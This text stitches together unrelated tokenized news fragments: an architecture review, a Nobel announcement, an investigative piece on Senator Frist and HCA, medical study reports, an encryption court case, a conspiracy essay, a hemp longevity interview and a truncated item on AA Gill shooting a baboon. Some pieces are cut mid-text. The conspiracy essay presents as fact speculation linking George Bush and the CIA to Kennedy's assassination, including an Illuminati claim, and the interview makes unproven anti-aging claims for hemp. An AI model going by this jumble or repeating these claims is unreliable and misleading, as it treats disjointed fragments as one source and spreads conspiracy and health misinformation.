Gehry went to great pains to fuse his building with the city around it .
The ribbons of shiny stainless steel that envelop the structure lift up seductively along Grand Avenue to draw passersby into the lobby .
Just above , the facade swells out to echo the curves of the Music Center ’s Dorothy Chandler Pavilion next door , a gesture that gives the old structure sudden , unexpected grace .
But if Mr. Gehry ’s creation has brought instant vitality to the street , it also demonstrates architecture ’s limits as an agent for social healing .
Even as the building was rising , Mr. Gehry and a choir of other voices were lobbying hard to break down the physical barriers that isolated the avenue from the rest of downtown .
Many of the solutions were obvious .
Mr. Gehry produced an elegant design to bring the Music Center ’s plaza down to the level of the avenue .
Civic leaders envisioned a park that would extend east from the base of the Music Center down to City Hall , linking the arts district to downtown ’s civic core .
So far these proposals have come to naught , and just as in Dallas , vast lots bulldozed decades ago remain undeveloped .
The failures in Dallas and Los Angeles , in the end , have less to do with too much creative freedom , the quality of the buildings and the master plan , or even the basic concept of an arts district , than with scale and context .
They reflect the long battle between those who want to tear down old barriers and those who simply want to replace them with new ones .
Solving that conflict will be left to a future epoch .
Herta Müller , the Romanian - born German novelist and essayist who writes of the oppression of dictatorship in her native country and the unmoored existence of the political exile , won the 2009 Nobel Prize in Literature on Thursday .
Announcing the award in Stockholm , the Swedish Academy described Ms. Müller as a writer “ who , with the concentration of poetry and the frankness of prose , depicts the landscape of the dispossessed . ”
Her award coincides with the 20th anniversary of the fall of Communism in Europe .
Ms. Müller , 56 , emigrated to Germany in 1987 after years of persecution and censorship in Romania .
She is the first German writer to win the Nobel in literature since Günter Grass in 1999 and the 13th winner writing in German since the prize was first given in 1901 .
She is the 12th woman to capture the literature prize .
But unlike previous winners like Doris Lessing and V. S. Naipaul , Ms. Müller is a relative unknown outside of literary circles in Germany .
She has written some 20 books , but just 5 have been translated into English , including the novels “ The Land of Green Plums ” and “ The Appointment . ”
Company run by Frist 's brother made $ 630 m deal two days before he announced he would be leader John Byrne Print This | Email This Bill Frist , it seems , needs a doctor .
The Senate 's plaintive Southern physician -- envisioned as the Republicans ’ antidote to a seemingly racist Trent Lott -- is hemorrhaging political capital .
The doctor who so memorably assuaged a terrified nation in the wake of the 2001 anthrax attacks is now dancing to a dangerous duet of swirling stock probes .
Today , a RAW STORY investigation has turned up more intrigue surrounding Senate Majority Leader Bill Frist 's affiliation with his family 's booming for - profit hospital chain , HCA .
Advertisement
Just two days before Sen. Trent Lott ( R - MS ) stepped down as Majority Leader in 2002 , the company Frist 's father started quietly settled a massive Medicare fraud lawsuit for $ 630 million .
The eleventh - hour deal -- brokered with Justice Department attorneys after a seven - year court battle -- was made as Frist ( R - TN ) secured the necessary votes to assume the Senate 's top post .
Those close to the case tell RAW STORY that top HCA executives were scheduled to be deposed the following month .
Frist 's brother , Thomas Jr. , would have been forced to go on the record during the opening days of the senator 's tenure as leader .
The timing of the agreement could raise further questions about Frist 's ties to the company .
Given that the Justice Department had been investigating HCA since 1993 -- some 120 months -- the coincidence of a settlement date so close to Frist 's leadership election is striking .
Whether Tennessee 's most renowned cardiac surgeon is telling the truth about his ties to the company his brother steered through a massive federal fraud investigation could have bearing on an investigation into whether he had inside information when he sold his shares in June .
Frist spokewoman Amy Call vehemently denied that the senator had been in any way involved .
" Senator Frist has never worked for HCA , " she told RAW STORY .
" He never worked for a HCA hospital . "
HCA did not return a call seeking comment .
A troubled company 's money funds a senator
It was the nation 's largest for - profit hospital conglomerate -- started by Frist 's father and until recently run by Frist 's brother -- that paved the ambitious Senator 's way from Vanderbilt University 's operating room to Capitol Hill .
The company 's stock made up most of the doctor 's wealth ; he spent $ 3.4 million of his own money in his 1994 Senate campaign .
That wealth , however , has become a thorn in the senator 's side .
Frist sold his HCA shares alongside company insiders this July , two weeks before the firm issued a disappointing earnings forecast .
Last week , the U.S. Attorney for the Southern District of New York subpoenaed the company with regard to Frist 's sales .
On Wednesday , the Securities and Exchange Commission upgraded its probe of Frist 's possible insider trading to a formal investigation .
All in the family HCA was founded by Frist 's father , Thomas , in 1968 .
His brother , Thomas Jr. , ran the company through troubled waters in the 1990s and after a short stint as vice - chairman following a merger , returned to become chairman .
In the late nineties , the 300 - hospital company was the seventh largest employer in the United States .
But the company was plagued by allegations of fraud , which dated from a whistleblower claim in 1993 .
Shortly after Thomas Jr. became CEO again in 1997 , federal agents raided the company 's El Paso operations .
The following year , the Securities and Exchange Commission began investigating whether executives gave investors accurate figures .
Shareholders and insurers then began suing the company , suspecting they had been overcharged .
By 1999 , eleven states were involved in litigation .
Faced with the threat of a massive settlement , Thomas shed assets and amassed a legal war chest , buying back $ 2 billion in shares .
After an internecine legal battle , HCA settled with the Justice Department in 2001 for $ 840 million .
The charges included bilking Medicare , Medicaid and the military ’s healthcare system by intentionally misidentifying marketing expenses as reimbursable " community education , " striking illegal deals with home care agencies , and claiming reimbursement that idle space in a hospital was being used for patient care .
The fraud investigation involved 30 U.S. attorneys ' offices , 22 FBI field offices , inspectors general from the Health and Human Service Department and the Office of Personnel Management , Defense Department investigators and state fraud units .
More money and more litigation
But it was n't over .
Under a 2002 settlement – announced just before Frist took his leadership post – HCA settled with the Justice Department for allegedly filing false claims and paying kickbacks to doctors so they would refer Medicare and Medicaid patients to its facilities .
The settlement was $ 630 million -- bringing the company ’s payouts for fraud to $ 2.7 billion , the largest in history .
This did n't , however , stop Frist from investing more in the company .
Just weeks after his election to Majority Leader , the man overseeing the senator ’s " blind trust " wrote Frist to inform him that more HCA stock had been added to his trust , valued at between $ 25,000 and $ 50,000 .
Two weeks later , the Tennessee senator told a television audience , " Well , I think really for our viewers it should be understood that I put this into a blind trust .
So as far as I know , I own no HCA stock . "
Referring to his " blind trust , " valued at between $ 5 million and $ 25 million according to campaign disclosure forms , he added , " I have no control .
It is illegal right now for me to know what the composition of those trusts are .
So I have no idea . "
At the end of the day , when the settlement was finally approved , Republican senator Chuck Grassley ( R - IA ) , asserted that the $ 2.7 billion deal hardly covered the awesome fraud perpetuated by HCA .
" I had to badger the Justice Department to see the math in this case , ” Grassley remarked .
" At the last minute , the Justice Department agreed to show my investigators why this settlement was the best the government could do .
There 's no way to know exactly how much HCA pocketed .
This case is so complicated , and so huge , that no one will ever know exactly how much HCA took .
This case is troubling because it shows how one company , with unbridled greed , systematically defrauded the government 's health care programs . "
HCA has given $ 83,450 to Frist 's campaigns since 1989 .
The company 's chief executive donated $ 21,000 to Frist 's political action in the last two years -- some $ 5,000 of it this April .

-- Small study demonstrates possibilities of reducing unnecessary MRI tests and improving safety
September 18 , 2009 - In a small “ proof of principle ” study , stroke researchers at Johns Hopkins and the University of Illinois have found that a simple , one - minute eye movement exam performed at the bedside worked better than an MRI to distinguish new strokes from other less serious disorders in patients complaining of dizziness , nausea and spinning sensations .
Results of the study of 101 patients , who were already at higher than normal risk of stroke because of factors including high blood pressure or high cholesterol , were published online ahead of print on Sept. 17 in Stroke .
The patients were all seen at OSF St. Francis Medical Center in Peoria , Ill .
The project , spearheaded by a Johns Hopkins neurologist in collaboration with colleagues at the University of Illinois in Peoria , found that the quick , extremely low - cost exam caught more strokes than the current gold standard of MRI , suggesting that if further research on broader populations confirms these results , physicians may have a way to improve care and avoid the high costs of MRI in some cases .
“ The idea that a bedside exam could outperform a modern neuroimaging test such as MRI is something that most people had given up for dead , but we ’ve shown it ’s possible , ” says David E. Newman - Toker , M.D. , Ph.D. , assistant professor of neurology at the Johns Hopkins University School of Medicine .
Dizziness is a common medical problem , Newman - Toker says , responsible for 2.6 million emergency room visits annually in the United States .
While the vast majority of dizziness complaints are caused by benign inner-ear balance problems , about 4 percent are signals of stroke or transient ischemic attack ( TIA , a condition that often warns of impending stroke in the coming days or weeks ) .
Because more than half of patients with dizziness who are experiencing strokes show none of the classic stroke symptoms — one - sided weakness , numbness , or speech problems — emergency room physicians are estimated to misdiagnose at least a third of them , losing the chance for quick and effective treatment .
“ We know that time is brain , so when patients having a stroke are sent home erroneously , the consequences can be really serious , including death or permanent disability , ” says Jorge C. Kattah , M.D. , chairman of neurology at OSF St. Francis Medical Center , who co-led the study .
The study of eye movement tests was suggested by previous research showing that people experiencing a stroke have eye - movement alterations that correlate with stroke - damage to various brain areas and that these are distinct from eye - movement alterations seen with benign ear diseases .
Some patients , for example , ca n’t immediately adjust their eye position if their heads are quickly turned to the side , or they experience jerky eye movements as they try to focus on a doctor ’s finger when looking to either side .
Newman - Toker and his colleagues at the University of Illinois College of Medicine in Peoria wondered whether testing eye movements in dizzy patients might help them sort out which ones were having a stroke from those with other problems .
All of the patients in the current study were seen after complaining of severe dizziness that had lasted for several hours continuously , and all had at least one risk factor for stroke .
The researchers selected them to increase the chance that they would find strokes in this population .
None of the patients had a history of previous dizzy spells and more than half sought care at the Peoria medical center ’s ER , though some were inpatients at the hospital or were transferred from other area hospitals .
The researchers gave each patient an exam comprised of three eye - movement tests : looking for inability to keep the eyes stable as patients heads were rotated rapidly to either side , looking for jerkiness as patients tracked a doctor ’s finger to look right and left , and checking eye position to see if one eye was higher than the other .
Each patient then received an early MRI , the highest - quality neuroimaging test available to confirm stroke in dizzy patients .
Patients with eye tests suggesting stroke but without stroke on the first MRI scan underwent a repeat scan .
In the end , 69 patients were diagnosed with stroke and 25 with inner-ear conditions .
The remainder had other neurological problems .
Using only the three eye - movement tests , the researchers had correctly diagnosed all of the strokes and 24 of 25 with inner-ear conditions .
By contrast , initial MRI scans were falsely negative in eight of the 69 stroke patients , who were later correctly diagnosed with follow - up MRIs .
Though the researchers emphasize the need to verify their results in a larger and more general population of patients with dizziness , Newman - Toker says the initial findings are “ incredibly promising . ”
If they hold true , he adds , testing eye movements could have several advantages over MRI beyond reliable diagnostics .
For example , while the wait time for an MRI can be several hours or more , physicians can perform all three eye - movement tests in a minute or less .
Also , the eye - movement tests are “ basically free , ” compared to $ 1000 or more for an MRI , Newman - Toker says .
“ In an era where cost containment is butting up against issues of quality in health care delivery , there ’s tremendous potential for bedside approaches like ours that could reduce costs while improving quality at the same time , ” says Newman - Toker .

Interns Help Small Businesses Go Green in Chinatown , LES
The Win-Win Campaign sounds to me like it would deliver about four big “ wins . ”
So , who wins ?
Youth :
The training and internship program equips young people with green job skills , preparing them for work in a growing sector .
Small businesses : Small businesses can cut down on expenses by increasing energy efficiency , and better communicate their greening efforts to consumers .
Consumers :
The program addresses the need for “ Concrete , measurable , verifiable ways for consumers to gauge the greenness of a company . ”
Our environment : Obviously , all of this would result in fewer carbon emissions and less wasted energy .
According to Ideal Bite , the program has been offering free energy audits to small businesses in Chinatown and the Lower East Side so far , and will expand to East Harlem early in 2010 .
Let ’s hope the idea takes hold and comes to many more neighborhoods !

Involving family members of pediatric cancer and hematology patients in medical rounds benefits both the family and the medical team , according to a new Indiana University School of Medicine study .
Riley Hospital for Children , where the study was conducted , is now one of only a small number of hospitals nationwide routinely offering the parents of pediatric cancer and hematology patients the opportunity to join their child 's medical team as active participants in the discussion and planning of their son's or daughter 's care .
Medical rounds in hospitals across the United States have changed over the years .
They have evolved from formal didactic presentations conducted with great pomp in auditoriums with theater seating where the patient sat quietly on display ; to bedside rounds as portrayed in television programs such as Scrubs , Grey 's Anatomy and House .
The current practice of sit - down team rounds physically removed from the family and patient have become standard due to heighted sensitivity to medical privacy .
The composition of rounding teams has evolved as well .
At leading medical institutions , like Riley Hospital , the rounding team has expanded to include nurses , social workers , nutritionists , clinical pharmacists , and others in addition to the traditional medical students , residents , fellows and the attending physician .
The more medical participants involved , the less likely parents were to participate as team rounds moved from the bedside to the conference room .
" Parents of children with cancer are often in an unsettling environment and are under a lot of stress .
They frequently feel unable to communicate effectively with the many people who are taking care of their daughter or son .
They may be reluctant to leave their child 's bedside for fear of missing the opportunity to talk with members of the medical team , " said Holly M. Knoderer , M.D. , M.S. , clinical assistant professor of pediatrics and clinical pharmacology at the IU School of Medicine and a Riley Hospital oncologist , who conducted the study and published its results in the November 2009 issue of Academic Medicine .
" The importance of the family 's involvement in caring for children with cancer and blood disorders is as tremendous as the need to successfully educate our medical students and residents about the value of effective communication and family - centered care .
Despite initial reluctance from fellows and nurses , having family members join in rounds was hugely successful and improved the standard of care , " said Dr. Knoderer , who is a member of the Indiana University Melvin and Bren Simon Cancer Center .
Each weekday morning , patients ' families are given the opportunity to sign up to attend sit - down team rounds when their child 's case is discussed .
Participation is voluntary , and family members can both ask questions and offer input .
Together , medical students , residents , fellows , family members , and the attending physician formulate the treatment plan for that day .
" Doctors are the medical experts , but the parents are the expert on their child .
Treating parents as valued team members not only increases family satisfaction but improves care , " says Dr. Knoderer .
" An unexpected benefit of the new style of rounds was that parents were less distracted in team rounds than at the bedside .
In the child 's room , parents and physicians often balance a ringing phone , computers , television / video games , a demanding sibling or a patient request .
We observed that parents sitting in rounds were more focused and often came with a list of specific questions or concerns .
Because the family understood that they had limited time in team rounds , they were more focused , " wrote Dr. Knoderer .
Additionally , parents were no longer afraid to leave their child 's room in fear that they would miss an opportunity to talk with the attending physician .
The presence of family members in team rounds minimally prolonged team rounds .
Overall , medical team work load was either unchanged or somewhat shortened during the study , as most families who attended team rounds needed far less time later at the bedside , and plans were less likely to change as a result of discussions made earlier in the day during team rounds .
One hundred percent of families who participated in the program indicated that family inclusion in rounds should be continued .
For some patients , both the mother and father attended .
Other days , one parent attended while the other stayed at the bedside .
Older siblings or grandparents who were active participants in the patients ' care often attended rounds .
Teenage patients were also invited .
In fact , it was often the teenage patients who attended most regularly .
" Families reported increased feelings of inclusion , respect , and having a better understanding of their child 's care , " Dr Knoderer reported .
While medical students and resident physicians recognized the value of family inclusion for patient care and family satisfaction , some doubted the benefit to their own training .
Yet , all acknowledged that parents should be allowed to participate in team rounds .
Attending physicians indicated that parental inclusion in team rounds was an important teaching opportunity .
It allowed attending physicians to better observe , evaluate , and give feedback on the trainees ' communication skills .
" Parents of children with cancer become quite savvy .
They reserve their toughest questions for the attending physician .
When the attending makes rounds alone , the medical team can't witness these sensitive discussions .
Allowing the medical trainees to witness difficult conversations about diagnosis , treatment and prognosis gives trainees a basis from which they develop their own practice style .
Each interaction between parent and attending physician allows trainees to determine how the trainee can most effectively communicate with their patients .
We hope that our trainees can use these interactions to model their own style of interaction with patients and families .
We aim to provide the foundation on which each trainee can build effective communication skills , " said Dr Knoderer .

An Australian man who set up an elaborate network of hidden cameras to spy on his flatmates has escaped jail time after police were unable to crack the encryption scheme protecting his computer .
When police raided the residence of Rohan James Wyllie , they found found a series of peepholes drilled into the walls and doors of rooms occupied by his two female and one male flatmates .
Wires led to Wyllie 's bedroom , and the names of files on his computer were consistent with video footage that would have been recorded onto the hard drive of his computer .
But the files were encrypted , and the 39 - year - old Wyllie refused to divulge the password .
The inability of police to review the files - combined with the fact that a camera he used was unplugged when the raid was commenced - meant prosecutors lacked the hard evidence they needed to prove the man had secretly taped his flatmates .
Wyllie eventually pleaded guilty in Southport District Court to one count of attempting to visually record a person without consent in a private place .
His lawyer said his client suffered from paranoid schizophrenia and believed his mates were conspiring against him .
Given the lack of evidence and the 33 days Wyllie already spent in jail , the judge hearing the case accepted the guilty plea .
He sentenced the man to two years of probation .
The legal status of encryption passwords remains unresolved in many parts of the world .
There were no press reports suggesting prosecutors in Australia had the authority to compel Wyllie to reveal his code .
But a US judge in Vermont earlier this year ordered a child porn suspect to decrypt his hard drive so investigators could inspect its contents .

THE GEORGE BUSH CONNECTION
In this day and age when some people can not even name the president of the United States , it is not the least bit surprising that most have no knowledge of George Bush 's possible connections to the Kennedy assassination .
The relationship has its roots in Bush 's " former " employment with the CIA .
As CIA agents have been quoted in the past , you never really leave the Agency .
THE CIA DID IT !
Many researchers place the blame for the murder of John F. Kennedy on the CIA .
The easiest way to clear the mafia or other non-governmental groups is to look at the massive cover - up that the government has participated in over the years .
If mafia boss Carlos Marcello had really ordered the hit , could he have had the CIA and FBI suppress so much evidence from the public for so long ?
Could he have had the normal security lowered for the assassination ?
Could he have had the Washington D.C. phone system knocked out of order for an hour right as the shooting took place ?
Could he have convinced the Warren Commission to release such an idiotic official version of the murder ?
Of course not .
The set - up and cover - up had to take place INSIDE of the government , not outside .
The CIA seemed to have the most ( and best ) motives for the elimination of Kennedy .
During the Eisenhower presidency , the CIA came up with a plan to invade Cuba at the Bay of Pigs .
The thought was that the citizens would hear of the attack and join in to overthrow Castro .
Former Cubans were trained by the CIA and the U.S. government fur- nished them with weapons and transportation .
Since it was near the end of his administration , Eisenhower put the plan on hold so the new president would not have to deal with any problems which might arise from the mission .
Upon entering office Kennedy decided that the plan 's requirement of 16 planes would obviously reveal American backing of the plot .
The plan had hoped that American involvement would not become known to the world .
The use of 16 planes would make American backing obvious to everyone .
Kennedy cut the number of planes down to six .
As the date of the invasion neared , Kennedy decided against the plan and announced in the press that the United States would not invade Cuba with the military .
The CIA went ahead with the plan and quickly found that things were not going as they had hoped for .
They asked for more planes but were told they would have to be held back until the forces captured a Cuban airport .
Then , the planes could be sent and the explanation would be that they were captured planes which the rebels had put into use .
The CIA - backed rebels never got that far and were quickly defeated .
The citizens of Cuba never joined them in the fight .
The CIA , as has been revealed in books by participants , blamed Kennedy for the defeat .
The books and papers reveal a deep hatred for the imagined betrayal .
Later , Kennedy formed a panel to keep him informed as to what was going on in Vietnam .
American involvement was still low at this point but Kennedy was worried .
He has been quoted as saying he could not justify sending American boys half - way around the world to fight communism when it existed just south of Florida in Cuba .
One of the panel 's members was Allen Dulles , head of the CIA .
Kennedy caught him in various lies and fired him .
The fact that the CIA had kept training Cubans for another invasion until Kennedy finally sent in FBI agents to break up their camps and confiscate their weapons was another reason for the dismissal .
Other high - ranking CIA officials were fired , too , including the brother of Dallas ' mayor .
Kennedy changed the operating procedure of the CIA so they would have to get approval for any future covert actions from Robert Kennedy .
Due to persistent problems with the CIA and their continual involve - ment in matters which were not their concern , Kennedy declared that he was going to shatter the CIA into a thousand pieces and scatter them to the winds .
Even former president Truman , who had created the CIA , expressed concerns about their behavior .
Kennedy was apparently going to leave their destruction until after the next election but did start withdrawing troops from Vietnam , much to the dislike of the CIA .
One of Johnson 's first moves after he replaced Kennedy as president was to increase American involvement in Vietnam .
It seems he owned an airline company that was contracted to fly troops back and forth across the Pacific Ocean , but that is another matter .
Later , E. Howard Hunt , on behalf of the CIA , faked cables to implicate John F. Kennedy in the assassination of South Vietnam 's president , Ngo Dinh Diem .
So , it is apparent that the CIA disliked Kennedy and had the means to set - up and cover - up the assassination .
Now , it is known that they convinced the Warren Commission that the Soviet Union and Cuba had murdered Kennedy .
They scared the members into believing that revealing this to the American public would result in a nuclear war in which millions would be killed .
To further this theory , they produced fake evidence showing that Oswald had visited the Soviet and Cuban embassies in Mexico to arrange the killing and escape .
The head of the CIA operations in Mexico has since admitted that no such real evidence ever existed .
A Warren Commission investigator has admitted that they acted to save millions by sacrificing one man ( Oswald ) .
The job was not too hard to pull off since former CIA - head Allen Dulles was a member of the Commission .
He was the only one to attend more than half of the hearings and was also in charge of deciding what intelligence data was seen by the other members .
President Johnson did n't seem to find it strange to appoint the man that Kennedy had fired to investigate his hated former boss ' murder .
SO HOW DOES BUSH FIT IT ?
Although he denies it , there is a growing body of evidence that George Bush was working for the CIA as early as 1961 .
Many feel he was actually recruited during his college days ( which is when he joined the Skull and Bones Society , a front for the Illuminati ) .
Bush claims to have been working for his own oil company during the early 1960's .
It would make for a convenient front since he claims to have been off - shore on drilling rigs for weeks at a time .
The rigs were located all over the world .
Was he really on the rigs or was he running around on CIA business ?
The various biographies of Bush are all sketchy on this phase of his life .
During this time , Bush had moved to HOUSTON , Texas .
His wife was , of course , BARBARA .
His oil company was ZAPATA Off Shore Co. ( which he named after a communist Mexican revolutionary who would invade towns and murder every man , woman and child .
Bush also named an earlier oil company after Zapata , a questionable choice for a hero ) .
The code name for the Bay of Pigs invasion was Operation ZAPATA !
A former high - ranking Pentagon official , Col. Fletcher Prouty , was the man who secured two Navy ships for the operation .
He has told of seeing the two ships repainted to non-Navy colors for the invasion .
The ships were given the new names HOUSTON and BARBARA !
Of course , maybe the names were just coincidences , but Bush was living in Houston with Barbara and running Zapata in 1961 during the planning of the invasion .
The name " Operation Zapata " was top secret and known only to a very few .
In 1977 and 1978 , the government released nearly 100,000 pages of documents on the Kennedy assassination .
One which slipped out by mistake was from the FBI to the State Department written a few days after the assassination .
The State Department was worried that anti- Castro groups in Miami might stage another invasion of Cuba in the aftermath of the JFK murder .
The FBI informed them that they had questioned both pro-Castro and anti-Castro groups and could find no information about such plans .
The memo went on to state that the information was passed along to " George Bush of the Central Intelli - gence Agency " the day after the assassination .
Why was the information passed along to the CIA ?
Probably because of their previous invasion attempt and other planned attacks .
Why George Bush ?
Probably because he was involved in previous invasion plans !
When the document first surfaced no one paid much attention to it .
When the presidential campaigns began for the 1980 election then the name George Bush caught researchers ' eyes .
When asked about the memo , Bush denied working for the CIA at the time .
As evidence built that it was indeed him , the CIA claimed it was a different George Bush although their policy had always been to neither confirm nor deny a person 's employment .
The other George Bush was tracked down by reporters and said that although he did work for the CIA at the time , he was never involved in that sort of work .
The interesting point is that the CIA did not bother to contact the other George Bush and inform him that reporters might soon be calling .
Other evidence surfaced that showed the George Bush mentioned in the document was actually George H. W. Bush and had the same address as the famous George Bush .
Another Bush connection involved George de Mohrenschildt , a rich Russian oil man who lived in Texas when Lee Harvey Oswald settled there after his trip to the Soviet Union .
De Mohrenschildt was a long - time CIA agent and quite possibly served as a CIA control officer for Oswald .
The Warren Commission described him and his wife as being the two people friendliest to Oswald at the time of the assassination .
De Mohrenschildt 's son- in - law told the Warren Commission that if any - one had helped with the assassination it was most likely de Mohren - schildt .
De Mohrenschildt was also the man who moved Oswald to Dallas .
Shortly before the House Select Committee on Assassinations started meeting in the late 1970's a new doctor appeared in de Mohrenschildt 's town .
De Mohrenschildt started seeing him and quickly became mentally unstable .
His wife convinced him to stop seeing the doctor .
The doctor then moved away and left a false forwarding address .
The very day the Committee tried to contact de Mohrenschildt about testifying , he was found dead of a gun shot wound .
His personal address book was found and it contained the entry " Bush , George H. W. ( Poppy ) 1412 W. Ohio also Zapata Petroleum Midland . "
Bush 's full name is George Herbert Walker Bush which matches the initials given and his earlier oil company was named Zapata Petroleum Corp .
Why was his name in de Mohrenschildt 's book ?
Is " Poppy " his CIA code name ?
It is known that in the early 1960 's de Mohrenschildt made frequent trips to Houston , which was the location of Bush 's home .
He told friends he was visiting the Brown brothers , who were close friends and financial supporters of Lyndon Johnson .
CIA documents reveal that during the planning phase of Operation Zapata , de Mohrenschildt made frequent trips to Mexico and Panama and gave reports to the CIA .
His son - in - law told the Warren Commission that he believed de Mohren - schildt was spying for the planned Cuban invasion .
A QUESTION OF CHARACTER
When Bush was picked to be director of the CIA in 1976 , he testified to Congress that he had never worked for the CIA before .
Of course , it did not make much sense to appoint a director who had no such back - ground but Congress approved him anyway .
Now it would seem that Bush committed perjury in his congressional testimony .
George Bush was apparently high enough in the CIA to help plan the Bay of Pigs invasion .
It would probably be safe to assume that he even named the operation and its two ships .
Considering the hatred that the CIA felt toward Kennedy over their failed mission and Bush 's involvement in that same mission , it would be quite interesting to know what Bush 's feelings toward John F. Kennedy really were and what his full role in the assassination investigation was .
Further information on the George Bush connection may be obtained from Mark Lane 's " Plausible Denial " ( Thunder 's Mouth Press ) and James " Bo " Gritz 's " Called To Serve . "
Lane 's book is an excellent accounting of the CIA 's involvement ( especially E. Howard Hunt and Frank Sturgis ) .
Gritz ( a 1992 presidential candidate ) tells about many of the CIA 's questionable ventures and also about his trips to Laos to attempt rescues of American POWs who are still held by Vietnam .

Morris Johnson is n’t your typical longevity researcher , if such a thing can be claimed to exist .
Johnson does n’t have the usual alphabet soup of accreditations following his name , but a childhood epiphany drives his interest in the mastery of human mortality .
While much has been made of the nutritional value of hemp in the past few years , Johnson , a Saskatchewan hemp farmer and chief technical officer of Canada ’s Lifespan Pharma , Inc. , believes that the plant has rare properties that can dramatically increase the lifespan of humans .
His work with Hemp for Horses is the first step in providing a scientific basis for eventual human clinical trials .
I spoke with Johnson recently about longevity , hemp and salad dressing , as well as the hurdles faced by the plant ’s proponents in the scientific community and the biases and stigma that flourish within it .
h+ : What is so great about hemp ?
MORRIS JOHNSON :
It is one of the superfoods supplying a cornucopia of oils , proteins , fiber and phytonutrients .
Nutritional density is a key aspect .
As you consume your basic proteins and carbohydrates and oils , you want a food that also delivers nutritional supplementation in both quality and quantity .
Hemp has gamma- linolenic acid , arginine , caryophyllene , functional terpenes , cannabidiol in high enough concentrations to accomplish anti-aging functions as detailed in scientific papers .
h+: How did you first get involved with hemp and longevity ?
MJ : When I was three years old I said out loud to myself , “ I will never die . ”
I remember where I was , that I was drawing some pictures , and that the thought just came to me .
That moment has influenced everything I have done in the succeeding 51 years .
Over the years , aspects of science that contributed to potential healthspan extension became more clear with every new paper I read .
When hemp became a legal crop to grow in Canada , I researched the chemistry and found that unique compounds found in hemp fit the niche of anti-aging compounds , with a high potential to bridge the gap between what we have easily available today to keep us vital and healthy and to be a good candidate to make the leading edge technologies work to their best in the future .
h+ : Why use horses for tests ?
MJ : Two reasons .
Horse owners with high - value performance horses have a history of looking for and applying new ways to keep their highly stressed animals healthy and fit to show and breed .
They are not averse to spending money on their horses so long as they see results in a reasonable period of time .
They have experience with many supplements and understand how to administer and evaluate the results .
They take better care of their horses than many ordinary people do to themselves and their children .
If regulators question their supplement choices , they usually tell the regulators to mind their own business and bother somebody who really cares .
Secondly , I had a close business relationship with a horse breeder who sold supplies and products to the equine industry .
Thus Hemp For Horses ( See Resources ) was formed .
h+ : What ’s the process of getting approval for clinical human trials in Canada ?
MJ : We plan to work with leaders in the research community like the University of Saskatchewan ’s “ Research Group on Aging ” to proceed from study design to publication .
Initial focus however is in the U.S. , where DSHEA regulations foster an open market for our hemp - based compounded formulations .
Proceeding under the guidance of a “ Clinical Research Compliance Manual , ” we will fund product - specific trials focused on positioning hemp in combination with other industry accepted anti-aging supplements and verify the findings , then publish in recognized journals .
h+ : I ’m confused by your statement that DSHEA regulations foster an open market when hemp production is banned .
MJ : In a nutshell :
You ca n’t grow hemp in the United States in any meaningful way that would be commercially feasible .
But you can import hemp from any jurisdiction that allows it to be grown and processed .
So long as the THC ( if any ) is documented by an accredited lab and all supporting documents are presented to the appropriate gatekeepers , it is permitted to be freely moved , manufactured and sold in the USA .
This is exactly what I have done .
h+ :
Is there a stigma regarding hemp in the research community ?
MJ: Absolutely .
Many researchers would rather create analog proprietary molecules that are divorced from the image of a marijuana leaf .
The marijuana industry uses the term hemp indiscriminately and smears hemp with the image of being a mind - altering drug … sort of like low - quality marijuana .
The effort to teach the public that hemp is to canola in the same way marijuana is to rapeseed would be both confusing and expensive , so it ’s not a priority .
The proper way to approach the research community is to proceed from the science that defines cannabidiol and caryophyllene as compounds that appear to create health and reduce some of the seven aspects of aging as defined by Dr. Aubrey de Grey .
In a moment of sheer frustration , I created a logo with a hemp leaf and a red circle with a stroke through it and encircled it with the words , “ I ca n’t believe it ’s not marijuana . ”
h+ : I heard an analogy on MSNBC .
They said it would take a joint the size of a telephone pole to even begin to suspect a psychoactive result from smoking hemp .
Are scientists like “ normal ” people in that they need a non-subtle graphic illustration to overcome their bias ?
MJ : Hemp products are regulated in Canada to not exceed 30 ppm ( of THC ) .
Pot has 10,000 - 25,000 ppm .
At that rate , you would have to consume between 3 and 7.5 kg ( 6.6 - 16.5 pounds ) of hemp at one sitting to get the same buzz as one gram of good pot , so the telephone pole - sized joint [ analogy ] … is appropriate .
( Test kits and lab drug screening tests for employment vary , but usually test positive at 5 - 100 ppm . )
Scientists are likely more motivated by the fear that discussing any form of cannabis may impair their chances of getting research funding and grants or peer recommendations for their projects .
For example , Carl Sagan consumed marijuana but did not go out of his way to make it known to his peers and the public .
To those with a technical background in plant breeding , I refer to marijuana as analogous to rapeseed and hemp as comparable to canola — in respect to the comparative ingredients erucic acid and tetrahydrocannabinol .
I know many academics who like their pot , but who would criticize anyone who said good things about pot when they were talking in public .
Scientists are ordinary people in that they are chickenshits on this subject .
I would also say that those who promote pot mistakenly refer to pot as hemp , and that has seeded the same prejudice towards hemp as pot .
Given that some hemp varieties are visually indistinguishable from pot , the image of the two , including its leaf , have become co-mingled .
h+ :
What dressing goes best in a hemp salad ?
MJ : In season , I eat hemp buds and foliage in all sorts of foods .
I have made up hamburgers with hemp as a binder , drinks and smoothies with hemp added and hemp in salads with ranch dressing .
h+ :
You ’ve obviously integrated hemp into your diet , but would you see hemp extract used as a supplement ?
Scientists are ordinary people in that they are chickenshits on this subject .
MJ : I have patented a whole plant powder that can be combined with a number of other food supplements .
One formulation adds acetyl - l - carnitine , alpha-lipoic acid and carnosine , and is focused on keeping mitochondria from aging excessively .
I see resveratrol as a complementary addition .
In isolation , hemp has marked anti-aging applications .
When combined with a growing number of well - researched food supplements , hemp has a capacity to forestall degenerative aging processes and reduce future expenditures for pharmaceuticals and medical procedures .
h+:
Do you find it odd that in the United States the argument for legalizing and taxing marijuana has accelerated , while hemp policy remains stagnant ?
MJ : No , because legislators are not usually scientists or medical doctors , and massive numbers of confusing and conflicting messages have created long - standing prejudices towards anything tied to the word cannabis .
The legalizing / taxing issue is not science - driven , it is purely economic prospecting for new sources of public revenue .
It is not tied to health policy or to changing long - standing drug policy .
Hemp thus has become the misunderstood and neglected orphan that is more a nuisance than anything else to legislators .

Animal welfare groups voiced outrage today after the restaurant critic AA Gill said he shot a baboon on safari " to get a sense of what it might be like to kill someone " .
In a Sunday Times column , Gill recounted in detail how he shot the creature from 250 yards while hunting in " a truck full of guns and other blokes " in Tanzania .
He said he felt the urge to be " a recreational primate killer " before shooting the animal through the lung .
" This is morally completely indefensible , " said Steve Taylor , a spokesman for the League Against Cruel Sports .
" If he wants to know what it like to shoot a human , he should take aim at his own leg .
When man interacts with animals he owes a duty of care .
If you are killing to eat , that is a different matter .
This is killing for fun " .
Gill wrote : " I took him just below the armpit .
